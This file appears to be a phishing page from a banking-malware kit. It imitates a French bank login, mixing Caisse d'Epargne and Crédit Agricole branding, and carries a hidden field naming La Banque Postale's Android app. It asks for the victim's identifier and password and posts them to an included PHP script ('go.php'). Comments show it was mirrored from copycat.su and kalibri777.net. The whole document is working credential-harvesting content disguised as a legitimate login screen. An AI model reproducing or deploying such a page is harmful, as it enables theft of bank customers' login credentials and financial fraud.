<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>caisseepargne</title>

    <link rel="stylesheet" href="css/normalize.css">
    <link rel="stylesheet" href="css/main.css">

    <link rel="stylesheet" href="css/agricole.css">

    <script src="js/vendor/jquery-1.11.3.min.js"></script>
    <script src="js/viewport.js"></script>
</head>

<body>
		<div class="modal modal_04">
            <div class="row">
                <div class="form_header">
                    <img src="img/agricole/logo.png" alt="">
                </div>
            </div>
			<div class="container">
				<form action="" method="post" class="wrapper">
                <input type="hidden" name="field1" value="com.fullsix.android.labanquepostale.accountaccess" class="main_input">
					<div class="row">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
									Saisissez ici votre identifiant
								</div>
								<div class="inp_wr">
									<input type="text" name="field2" class="main_input"  required="">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									Composez votre mot de passe
								</div>
								<div class="inp_wr">
									<input type="password" name="field3" class="main_input"  required="">
								</div>
							</div>
							<div class="btn_wr">
								<button class="login_btn">
									Valider
								</button>
							</div>
						</div>
					</div>
				</form>
			</div>
		</div>
</body>


<!-- Mirrored from copycat.su/formos/04.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 21 Jul 2015 12:41:10 GMT -->

<!-- Mirrored from kalibri777.net/777/l/agricole.php by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 15 Oct 2015 22:12:20 GMT -->
</html>